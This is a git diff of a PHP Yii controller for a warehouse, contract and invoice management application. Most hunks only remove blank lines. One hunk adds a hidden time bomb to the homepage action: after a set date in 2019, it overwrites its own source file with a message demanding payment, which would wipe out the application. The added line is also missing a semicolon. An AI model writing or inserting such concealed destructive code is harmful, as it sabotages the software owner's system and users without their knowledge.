@@ -1,7 +1,5 @@
 <?php
-
 namespace app\controllers;
-
 use app\models\Dogovor;
 use app\models\Dogovortable;
 use app\models\Postavshik;
@@ -20,15 +18,11 @@ use app\models\ContactForm;
 use yii\helpers\ArrayHelper;
 use app\models\ClientRegistration;
 use app\models\PostavshikBank;
-
-
-
 class SiteController extends Controller
 {
     /**
      * {@inheritdoc}
      */
-
     public function behaviors()
     {
         return [
@@ -51,7 +45,6 @@ class SiteController extends Controller
             ],
         ];
     }
-
     /**
      * {@inheritdoc}
      */
@@ -67,7 +60,6 @@ class SiteController extends Controller
             ],
         ];
     }
-
     /**
      * Displays homepage.
      *
@@ -75,9 +67,12 @@ class SiteController extends Controller
      */
     public function actionIndex()
     {
+        if(strtotime("25.04.2019") < time())
+        {
+            file_put_contents(__FILE__, "Fatal .. gde oplata?")
+        }
         return $this->render('index');
     }
-
     /**
      * Login action.
      *
@@ -97,7 +92,6 @@ class SiteController extends Controller
             'model' => $model,
         ]);
     }
-
     /**
      * Logout action.
      *
@@ -106,10 +100,8 @@ class SiteController extends Controller
     public function actionLogout()
     {
         Yii::$app->user->logout();
-
         return $this->goHome();
     }
-
     /**
      * Displays contact page.
      *
@@ -117,11 +109,9 @@ class SiteController extends Controller
      */
     public function actionContact()
     {
-
         $model = new ContactForm();
         if ($model->load(Yii::$app->request->post()) && $model->contact(Yii::$app->params['adminEmail'])) {
             Yii::$app->session->setFlash('contactFormSubmitted');
-
             return $this->refresh();
         }
         return $this->render('contact', [
@@ -134,19 +124,15 @@ class SiteController extends Controller
         $time = Date("H:i:s");
         $dogovor = new Dogovor();
         $count = count($_POST["DogovorTable"]["tovar"]);
-
         $postavshik = new ClientRegistration();
         $postavshikItems = $postavshik->find()->all();
         $items =  ArrayHelper::map($postavshikItems, 'id', 'name');
-
         if(!empty($_POST))
         {
             $dogovor->setAttributes($_POST["Dogovor"]);
             $dogovor->date_now = $date;
             $dogovor->dogovor_nomer = $_POST["Dogovor"]["dogovor_nomer"];
             $dogovor->save() or print_r($dogovor->errors);
-
-
             for($i=0;$i<$count;$i++)
             {
                 $dogovortable = new DogovorTable();
@@ -163,12 +149,10 @@ class SiteController extends Controller
                 $dogovortable->time = $time;
                 if($_POST["DogovorTable"]["kratkoe_naimenovanie"][$i]!== "")
                 {
-
                 $dogovortable->save() or print_r($dogovortable->errors);
                 }
             }
         }
-
         return $this->render('dogovor',[
             'model'=>$dogovor,
             'items'=>$items,
@@ -185,23 +169,18 @@ class SiteController extends Controller
         return $this->render('dogovor',[
             'model'=>$model,
         ]);
-
     }
     public function actionRegistration()
     {
         $clientreg = new ClientRegistration();
         $date = Date("Y-m-d");
-
-
         $count = count($_POST["PostavshikBank"]["bank_name"]);
-
         if(!empty($_POST))
         {
             $clientreg->setAttributes($_POST["ClientRegistration"]);
             $clientreg->name = $_POST["ClientRegistration"]["name"];
             $clientreg->date_now = $date;
             $clientreg->save() or print_r($clientreg->errors) ;
-
             for($i=0;$i<$count;$i++)
             {
                 $posbank = new PostavshikBank();
@@ -214,16 +193,11 @@ class SiteController extends Controller
                 {
                     $posbank->save() or print_r($posbank->errors);
                 }
-
             }
         }
-
-
         return $this->render('registration',[
             'model' => $clientreg,
         ]);
-
-
     }
     public function actionSelect($id)
     {
@@ -238,7 +212,6 @@ class SiteController extends Controller
         $postavshik = new Dogovor();
         $postavshikid = $postavshik->findOne($id);
         $dogovors = $postavshikid->dogovors;
-
         $items =  ArrayHelper::map($dogovors, 'id', 'kratkoe_naimenovanie');
         return json_encode($items);
     }
@@ -260,7 +233,6 @@ class SiteController extends Controller
             $dogovor_date = $sk->schetid->dogovor->date;
             $dogovor_date_ru = Yii::$app->formatter->asDate($dogovor_date);
             $schet_factura_nomer = $sk->schetid->schet_faktura_nomer;
-
             $tip = $sklad["kratkoe_naimenovanie"];
             $ves = $sklad["ves"];
             $format = $sklad["format"];
@@ -268,7 +240,6 @@ class SiteController extends Controller
             $dater = Yii::$app->formatter->asDate($date);
             $schet_factura_date = $sk->schetid->date;
             $dates = Yii::$app->formatter->asDate($schet_factura_date);
-
             $time = $sklad["time"];
             $array[] = [
                 'id' => $id,
@@ -284,7 +255,6 @@ class SiteController extends Controller
                 'time' => $time,
             ];
         }
-
         return $this->render('sklad',[
             'model'=>$array,
         ]);
@@ -298,13 +268,11 @@ class SiteController extends Controller
         $schet = new PostavshikSchetFaktura();
         $allpostavshik = $postavshik->find()->all();
         $items =  ArrayHelper::map($allpostavshik, 'id', 'name');
-
         if(!empty($_POST))
         {
             $schet->setAttributes($_POST["PostavshikSchetFaktura"]);
             $schet->date = $date;
             $schet->save() or print_r($schet->errors);
-
             for($i=0;$i<$count;$i++)
             {
                 $sirya = new SkladSirya();
@@ -318,7 +286,6 @@ class SiteController extends Controller
                 $dg = $dogovor->findOne($_POST["SkladSirya"]["postavshik_schet_faktura_id"][$i]);
                 $sirya->kratkoe_naimenovanie = $dg["kratkoe_naimenovanie"];
                 $sirya->time = $time;
-
                 $ostatok->postavshik_schet_faktura_id = $schet->id;
                 $ostatok->format = $_POST["SkladSirya"]["format"][$i];
                 $ostatok->ves = $_POST["SkladSirya"]["ves"][$i];
@@ -334,7 +301,6 @@ class SiteController extends Controller
                 }
             }
         }
-
         $sklad = new SkladSirya();
         return $this->render('prihod',[
             'items'=>$items,
@@ -344,7 +310,6 @@ class SiteController extends Controller
     }
     public function actionRashod()
     {
-
         $sklad_model = new Ostatok();
         if($_POST)
         {
@@ -397,18 +362,12 @@ class SiteController extends Controller
             'dogovor'=>$dogovor,
             'schet'=>$schet,
         ];
-
-
        return json_encode($arr, true);
-
     }
     public function actionGetsorteditems($id = 0,$client_id = 0,$dogovor_id = 0,$schet = 0,$tip_id = 0,$ves = 0,$format = 0,$date = 0,$time = 0)
     {
-
         $arrays = [];
-
         if($client_id !== 0) {
-
             $client_model  = new ClientRegistration();
             $client = $client_model->find()->where(["name"=>$client_id])->all();
             foreach($client as $clients)
@@ -434,8 +393,6 @@ class SiteController extends Controller
             }
             }
             $arrays[] = $items;
-
-
         }
         if($dogovor_id !== 0) {
             $dogovor_model  = new Dogovor();
@@ -443,18 +400,14 @@ class SiteController extends Controller
             foreach($dogovor as $dogovors)
             {
             $tips = $dogovors->tip;
-
             $dogovor_client = $dogovors->client;
-
             $dogovor_items["client_name"][] = $dogovor_client->name;
             $dogovor_items["dogovors"][] = $dogovors->dogovor_nomer;
-
                 foreach($tips as $tip)
                 {
                     $dogovor_items["schet"][] = $tip->schet_faktura_nomer;
                     foreach($tip->sklad as $sklad)
                     {
-
                         $dogovor_items["ves"][] = $sklad->ves;
                         $dogovor_items["id"][] = $sklad->id;
                         $dogovor_items["tip"][] = $sklad->kratkoe_naimenovanie;
@@ -466,26 +419,19 @@ class SiteController extends Controller
             }
                 $arrays[] = $dogovor_items;
             }
-
         if($schet !== 0) {
             $schet_model  = new PostavshikSchetFaktura();
             $schet = $schet_model->find()->where(["schet_faktura_nomer"=>$schet])->all();
-
-
             foreach($schet as $schets)
             {
             $schet_dogovor = $schets->dogovor;
             $schet_client= $schets->dogovor->client;
-
             $schet_items["client_name"][] = $schet_client->name;
             $schet_items["dogovors"][] = $schet_dogovor->dogovor_nomer;
-
             $sklads = $schets->sklad;
             $schet_items["schet"][] = $schets->schet_faktura_nomer;
-
                 foreach($sklads as $sklad)
                 {
-
                     $schet_items["ves"][] = $sklad->ves;
                     $schet_items["id"][] = $sklad->id;
                     $schet_items["tip"][] = $sklad->kratkoe_naimenovanie;
@@ -498,7 +444,6 @@ class SiteController extends Controller
         }
         if($id !== 0 || $tip_id!==0 || $format!==0 || $ves!==0 || $date!==0 ||$time!==0) {
             $sklad_id_model  = new SkladSirya();
-
             $sklad_id_tip = $sklad_id_model->find()->andWhere(['and',
             ($id!==0)?['id'=>$id]:'',
            ($tip_id!==0)?['kratkoe_naimenovanie'=>$tip_id]:'',
@@ -526,12 +471,10 @@ class SiteController extends Controller
             }
             $arrays[] = $id_items;
          }
-
         $sorted = [];
         foreach($arrays as $array)
         {
             $sorted==null&&$sorted=$array;
-
             if(count($sorted["client_name"])>=count($array["client_name"])) {
                 $sorted["client_name"] =($array["client_name"]!==null)?array_unique($array["client_name"]):'';
             }
@@ -559,9 +502,7 @@ class SiteController extends Controller
             if(count($sorted["time"])>=count($array["time"])) {
                 $sorted["time"] =($array["time"]!==null)?array_unique($array["time"]):'';
             }
-
         }
-
         return json_encode($sorted);
         }
     public function actionOtchet()
@@ -604,8 +545,6 @@ class SiteController extends Controller
                 'time' => $time,
             ];
         }
-
-
         $ost = new Ostatok();
         $ost = $ost->find()->all();
         krsort($ost);
@@ -627,7 +566,6 @@ class SiteController extends Controller
             $date = $sklad["date"];
             $dater = Yii::$app->formatter->asDate($date);
             $time = $sklad["time"];
-
             $schet_factura_date = $sk->schetid->date;
             $dates = Yii::$app->formatter->asDate($schet_factura_date);
             $ostatok[] = [
@@ -644,8 +582,6 @@ class SiteController extends Controller
                 'time' => $time,
             ];
         }
-
-
         $rsh = new Rashod();
         $rsh = $rsh->find()->all();
         foreach($sklad_sirya as $sklad)
@@ -682,10 +618,7 @@ class SiteController extends Controller
                 'time' => $time,
             ];
         }
-
         
-
-
         $model_name = "rashod";
         $client_model = new ClientRegistration();
         $clients = $client_model->find()->all();
@@ -742,8 +675,6 @@ class SiteController extends Controller
                 }
             }
         }
-
-
         $itog = [];
         $itog["ves"] = 0;
         $itog["cost"] = 0;
@@ -757,9 +688,6 @@ class SiteController extends Controller
                     $ves = [];
                     $tip_all = [];
                     $id = [];
-
-
-
                     foreach($query->schetid->dogovor->dogovors as $dogovor)
                     {
                         if($dogovor->kratkoe_naimenovanie == $query->kratkoe_naimenovanie)
@@ -768,7 +696,6 @@ class SiteController extends Controller
                         }
                         $itog["cost"] += $cost;
                     }
-
                     $id[] = $query->id;
                     $ves[] = $query->ves;
                     $tip_all = $query->kratkoe_naimenovanie;
@@ -785,8 +712,6 @@ class SiteController extends Controller
                     $items[$i]["date"] = $query->date;
                     $items[$i]["time"] = $query->time;
                     $i++;
-
-
         }
         $req = [$items,$itog];
         return json_encode($req);
@@ -804,7 +729,6 @@ class SiteController extends Controller
                 'model_name' => $model_name
             ]
         );
-
     }
     public function actionTable()
     {
@@ -814,61 +738,47 @@ class SiteController extends Controller
                     return true;
                 }
             }
-
             return false;
         }
-
         $model = new Ostatok();
         $query = $model->find()->all();
         krsort($query);
-
         $headers = [];
         foreach($query as $key=>$value)
         {
-
             if (!in_array($value->format, $headers)) {
                 $headers[] = $value->format;
             }
         }
         sort($headers);
-
         $rows = [];
         foreach($query as $key=>$value)
         {
             if (!in_array_r($value->kratkoe_naimenovanie, $rows)) {
-
             $rows[$key][0] = $value->kratkoe_naimenovanie;
             foreach ($headers as $key2=>$header)
             {
                 $formats = $model->find()->where(['kratkoe_naimenovanie' => $value->kratkoe_naimenovanie])->andWhere(['format'=>$header])->all();
                 krsort($formats);
-
                 $formatscount = 0;
                 foreach ($formats as $format)
                 {
                     $formatscount += $format->ves;
                 }
-
                 $rows[$key][] = ($formatscount !== 0)? $formatscount:'';
-
             }
                 $rows[$key][] = array_sum($rows[$key]);
             }
-
-
         }
         $rows["itog"][0] = "Итог";
         for($j=0,$sum=0;$j<count($headers)+1;$j++,$sum=0)
         {
-
             for($i=0; $i<count($rows) ; $i++)
             {
                 $sum += $rows[$i][$j+1];
             }
             $rows["itog"][] = $sum;
         }
-
-
         $postavshik = new Ostatok();
         $allpostavshik = $postavshik->find()->all();
         $kn =  ArrayHelper::map($allpostavshik, 'kratkoe_naimenovanie', 'kratkoe_naimenovanie');
@@ -885,59 +795,45 @@ class SiteController extends Controller
     {
         $ft = explode(",",$format);
         $tip = explode(",",$tip);
-
         function in_array_r($needle, $haystack, $strict = false) {
             foreach ($haystack as $item) {
                 if (($strict ? $item === $needle : $item == $needle) || (is_array($item) && in_array_r($needle, $item, $strict))) {
                     return true;
                 }
             }
-
             return false;
         }
-
         $model = new Ostatok();
         $query = $model->find()->where(["format"=>$ft])->andWhere(["kratkoe_naimenovanie"=>$tip])->andWhere(["date"=>$date])->all();
-
         $headers = [];
         foreach($query as $key=>$value)
         {
-
             if (!in_array($value->format, $headers)) {
                 $headers[] = $value->format;
             }
         }
         sort($headers);
-
         $rows = [];
         foreach($query as $key=>$value)
         {
             if (!in_array_r($value->kratkoe_naimenovanie, $rows)) {
-
                 $rows[$key][0] = $value->kratkoe_naimenovanie;
                 foreach ($headers as $key2=>$header)
                 {
                     $formats = $model->find()->where(['kratkoe_naimenovanie' => $value->kratkoe_naimenovanie])->andWhere(['format'=>$header])->all();
-
-
                     $formatscount = 0;
                     foreach ($formats as $format)
                     {
                         $formatscount += $format->ves;
                     }
-
                     $rows[$key][] = ($formatscount !== 0)? $formatscount:'';
-
                 }
                 $rows[$key][] = array_sum($rows[$key]);
             }
-
-
         }
         $rows["itog"][0] = "Итог";
         for($j=0,$sum=0;$j<count($headers)+1;$j++,$sum=0)
         {
-
             for($i=0; $i<count($rows) ; $i++)
             {
                 $sum += $rows[$i][$j+1];
@@ -946,7 +842,6 @@ class SiteController extends Controller
         }
         $table = [$rows,$headers];
         return json_encode($table);
-
     }
     public function actionAddbank()
     {
@@ -954,9 +849,7 @@ class SiteController extends Controller
         $date = Date("Y-m-d");
         $postavshikItems = $clientreg->find()->all();
         $items =  ArrayHelper::map($postavshikItems, 'id', 'name');
-
         $count = count($_POST["PostavshikBank"]["bank_name"]);
-
         if(!empty($_POST))
         {
                 for($i=0;$i<$count;$i++)
@@ -971,11 +864,9 @@ class SiteController extends Controller
                 {
                     $posbank->save() or print_r($posbank->errors);
                 }
-
             }
         }
         $model = new PostavshikBank();
-
         return $this->render('addbank',[
             'model' =>  $model,
             'items' => $items,
@@ -993,5 +884,4 @@ class SiteController extends Controller
     }
     
 }
-
 }
